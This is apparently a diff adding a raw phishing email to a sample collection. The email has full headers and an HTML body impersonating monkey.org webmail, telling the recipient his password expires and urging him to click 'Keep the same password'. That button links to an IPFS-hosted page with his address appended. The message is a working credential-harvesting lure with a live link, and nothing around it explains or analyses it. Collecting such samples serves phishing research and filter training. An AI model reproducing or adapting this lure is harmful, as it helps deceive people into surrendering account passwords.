@@ -1,0 +1,159 @@
+Return-Path: webmail@support.org
+Delivered-To: jose@monkey.org
+X-FDA: 83259456882.22.BEDBC68
+Received: from sloppymove.aeza.network (unknown [85.239.147.203])
+	by imf27.b.hostedemail.com (Postfix) with ESMTP id C97FD1A0002
+	for <jose@monkey.org>; Tue, 25 Mar 2025 08:52:19 +0000 (UTC)
+Authentication-Results: imf27.b.hostedemail.com;
+	dkim=none;
+	spf=none (imf27.b.hostedemail.com: domain of webmail@support.org has no SPF
+ policy when checking 85.239.147.203) smtp.mailfrom=webmail@support.org;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1742892740;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=n2hOekaxnY154F9+OH2yALvwW+VCO0cn033PgGfaHtA=;
+	b=Kiqld0LfnWyoBYg+ixqGf2FQsYMeD7WDrvyMed64vtpR5WJxQGfcNSMFXXuTT9qpeMcRDu
+	iRBwtf28NGWAlDzayBI1NKgBHIwiJlyuIc6BvH7R4Hgi9jrMHvGOMFnPxf7T68VMJzEQ6V
+	bH8jDKPIc9+pv1rRtEA7Ftiw/Ukf728=
+ARC-Authentication-Results: i=1;
+	imf27.b.hostedemail.com;
+	dkim=none;
+	spf=none (imf27.b.hostedemail.com: domain of webmail@support.org has no SPF
+ policy when checking 85.239.147.203) smtp.mailfrom=webmail@support.org;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1742892740; a=rsa-sha256;
+	cv=none;
+	b=LpnbsZuKaA+kh43ud6y581KNznaQ/MZZxQD+22t7zBH3PwEPEBHrz3XaO+PkzVG6iitmVi
+	LiWXOjBhHZerpfVKfMK3SrBbIOM0GhPYZW35PTsRlmvOhtd3mvABe5upce5vPWrGsynsZ2
+	jJn0fdHnmShhCeRQKExGPf6dD6MLD7A=
+Received: from support.org (localhost [127.0.0.1])
+	by sloppymove.aeza.network (Postfix) with ESMTP id F279E544CAB
+	for <jose@monkey.org>; Tue, 25 Mar 2025 08:29:03 +0000 (UTC)
+From: monkey.org <webmail@support.org>
+To: jose@monkey.org
+Subject: Avoid restricting access to your monkey.org account.
+Date: 25 Mar 2025 04:29:03 -0400
+Message-ID: <20250325042903.5A70932EE2DD5462@support.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: C97FD1A0002
+X-Stat-Signature: sqzbnwp8x3hhhsuo9q9xhbbzdmrk9hdz
+X-Spam-Status: Yes, score=13.70
+X-Rspam-User: 
+X-Rspamd-Server: rspam11
+X-HE-Tag: 1742892739-798780
+X-HE-Meta: 
+ U2FsdGVkX18hVjI6D2wKKestlUSb95Xbgfpko8BLFe8RmJWfJqzNlAqMVS4knxk0f+afT3feKPE0LOvWv9T/OTlVHTEA73jG1aTSt2y8Tcu+lYNSvMUX8AuiW1iJvYE3bIQdcLwTPx0VWj50kNnkZ5q/2jW9JlZVhGH4bZdqfBMqV3Q+AFQDk9MpTkrZg0fTxmCuJFuabE2OounubPWOE3M6j77xM01QobQGAbI9wagEB4s0Zja4xveOJoL8/gttsDDIDpAPOcoawd8bklzt7rk/RyOoSoxSRlwbKftWFgOovq8rOSieo5sAcT4g3X1jT6Xm0nFfaFNgrLBGzxvJbRT4VMjZlN6et5j/o5MP1pdl9UcbN1x7i2N+UHzqpqMfzP2qCF6X6a0S9R9nzvGIbVOoPFtqKiWUbCXQMbt37xn5KVuc+y0Ltu6AGLmrTNzJoagD4ulLNNXkcggaxrDJC22gm0AiI2rL5ifaC/XQT6KJlpXPtcG/GlUqvs6gVZnCYOA6esuwLhr2eMH8mWqnX0l5KzgcHFiHzxWPawnaYy/xLcOiK7sVNxVq21Kg5DsDC/bfsBX3sry+Dzd9i7gX7MyjDfPoay12uHjobpefJthljSImJthPzkLjtYGVM3t62r4SMT/NhJ3giXilVkygHNtk1Pi5m7953nPCthxIr30mMdRU1/gT4blFBtUP5BylFtiUIYHcu6r4P4UM6QXnOjby2VtL28aN2P3UlkDHyFOiMpIAByI0Nr4VK/oKoM18I2EWkEowk8NaqSWD2c+2jCDSFV56riYjz+rl1mtOEsqnkBK3vtvTFItRwMirYuOY584oOVRm/RvfhodqKl8nTP9hotDG233gYC5R+/QEuyAxZ0ZKiTcgfJpRUezxbNZXHl8tVq6HMO0S+hRmr48n5X6SpdtMevaotEt/btJAcOIP84JkazyWF693FyJh5bYS4aJg6qWcf97ZVeDgvTswU1KaQNj
+ CbTz7yfB//jYp+w//DD7iDzXenXRjkVXYXAtq/p4Tqzgj1UrFWqYQgBFtK26+8WNYUyovjLLpZq+e+WWCtFkevMfKC5VpphegPt59w7ErX4uDIHyzGfG6XqCJamK6EiVl6nJAyXzhWoeBl/vcIAgF6/O0q3LccbfSrqfFQt3P7l6fKAH70rLgbf5WJThTGWL4Z9cA/Ojzn96dBNyYElJnrXuNJP57f6YH4dzXZjeeBLZGbsE2T6dKZZ/CJTQKMo1gMa1ytlqep7YiXPcNbwngmG03eZ3c7Sohg3GVF5eqiL87qQ4g/Si7nGOp6xk/jYkCuNntZtmO6FrRMckUkQRYKktDdGRbZfHLwTiUEOSOcLqeB+Viz+GaNzdv14y26zfHZm7TewypF+sPsbW2BeHWI/g13fk3Sv1CesULYqvjIKWLkBgw3GrGM+ewhhvgntxiU+qQLfJLktm0QnFuTCVEMe7WXlJWvsrk1gPkelsckLMnW3ktrt3miYbkaYCiLTkJjTUf5EkzpMibQdufUw22rFdoTsHcNFV/HKA2R23hp5D0ergrIDZe8GgGeSnwXBMxK3Pycqqj6dH+QOE2FmhgvoGEEh39WA1XXU4hIjh6PV5bG8U=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 107
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.5em;">
+<p align=3D"center" style=3D"color: rgb(36, 36, 36); text-transform: none; =
+text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; =
+font-size: 15px; font-style: normal; font-weight: 400; margin-top: 0px; wor=
+d-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wi=
+dows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
+n-style: initial; text-decoration-color: initial;">
+<span style=3D"font-family: Arial; box-sizing: border-box;"><span style=3D"=
+font-weight: bolder; box-sizing: border-box;"><span style=3D"font-size: 23p=
+t; box-sizing: border-box;"><span style=3D"color: rgb(238, 97, 17); box-siz=
+ing: border-box;"><span style=3D"font-size: 25pt; box-sizing: border-box;">=
+Webmail</span></span></span></span></span></p>
+<p align=3D"center" style=3D"color: rgb(36, 36, 36); text-transform: none; =
+text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; =
+font-size: 15px; font-style: normal; font-weight: 400; margin-top: 0px; wor=
+d-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wi=
+dows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
+n-style: initial; text-decoration-color: initial;">
+<span style=3D"font-family: Arial; box-sizing: border-box;"><span style=3D"=
+font-weight: bolder; box-sizing: border-box;"><span style=3D"font-size: 23p=
+t; box-sizing: border-box;"><span style=3D"color: rgb(238, 97, 17); box-siz=
+ing: border-box;"><a style=3D"color: rgb(34, 34, 34); font-family: Roboto, =
+sans-serif; font-size: 14px; font-weight: normal; box-sizing: border-box; b=
+ackground-color: transparent;"><font color=3D"#2c363a">Dear&nbsp;</font></a=
+>&nbsp;<span>&nbsp;</span>
+<a style=3D"color: rgb(17, 85, 204); font-family: Roboto, sans-serif; font-=
+size: 14px; font-weight: normal; box-sizing: border-box; background-color: =
+transparent;">jose</a><font color=3D"#2c363a" style=3D"font-family: Roboto,=
+ sans-serif; font-size: 14px; font-weight: normal;">&nbsp;</font><br style=
+=3D"box-sizing: border-box;"></span></span></span></span></p>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; orphans: 2; widows: 2; font-variant-ligatures: normal; font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thic=
+kness: initial; text-decoration-style: initial; text-decoration-color: init=
+ial;">
+<p align=3D"center" style=3D"margin-top: 0px; box-sizing: border-box;"><fon=
+t color=3D"#2c363a">Your password&nbsp;</font><font color=3D"#2c363a">expir=
+es from&nbsp;</font>3/25/2025 4:29:03 a.m..&nbsp;<font color=3D"#2c363a">(A=
+ction Required) You must take immediate steps to maintain and avoid restric=
+ting access to your&nbsp;</font>monkey.org<span style=3D"color: rgb(44, 54,=
+ 58);">&nbsp;account.</span></p></div>
+<p align=3D"center" style=3D"color: rgb(44, 54, 58); text-transform: none; =
+text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif; =
+font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; wor=
+d-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wi=
+dows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
+n-style: initial; text-decoration-color: initial;">
+&nbsp;</p>
+<p style=3D"padding: 20px 0px; color: rgb(44, 54, 58); text-transform: none=
+; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif=
+; font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; m=
+argin-bottom: 0px; word-spacing: 0px; white-space: normal; box-sizing: bord=
+er-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: i=
+nitial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><a title=3D"Read Fax" style=3D"background:=
+ rgb(227, 96, 9); padding: 11px 24px; color: rgb(255, 255, 255); box-sizing=
+: border-box; text-decoration-line: none;" href=3D"https://ipfs.io/ipfs/baf=
+ybeihfup37yw23zn5tnpkdl5vb6hy26oyx7i25qgbjecbl6iieuakefq/pages.html/#jose@m=
+onkey.org" target=3D"_blank" rel=3D"noreferrer">Keep the same password</a>&=
+nbsp;&nbsp;&nbsp;&nbsp;<span style=3D"color: rgb(227, 96, 9); box-sizing: b=
+order-box;">&nbsp; &nbsp;&nbsp;</span></p>
+<p style=3D"padding: 20px 0px; color: rgb(44, 54, 58); text-transform: none=
+; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif=
+; font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; m=
+argin-bottom: 0px; word-spacing: 0px; white-space: normal; box-sizing: bord=
+er-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: i=
+nitial; text-decoration-style: initial;=20
+text-decoration-color: initial;">Problems found in the claim fulfillment sy=
+stem will no longer be investigated or fixed.</p>
+<p style=3D"padding: 20px 0px; color: rgb(44, 54, 58); text-transform: none=
+; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-serif=
+; font-size: 14px; font-style: normal; font-weight: 400; margin-top: 0px; m=
+argin-bottom: 0px; word-spacing: 0px; white-space: normal; box-sizing: bord=
+er-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: i=
+nitial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><font size=3D"3"><font size=3D"3"><span st=
+yle=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; f=
+ont-size: small; box-sizing: border-box;">&copy;&nbsp;</span><span style=3D=
+"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; box-sizing: border-box;">monkey.org&nbsp;</span></font>&nbsp;<sp=
+an>&nbsp;</span>
+<span style=3D"color: rgb(34, 34, 34); font-family: Arial, Helvetica, sans-=
+serif; font-size: small; box-sizing: border-box;"><font size=3D"3">2025</fo=
+nt></span></font></p></body></html>
+
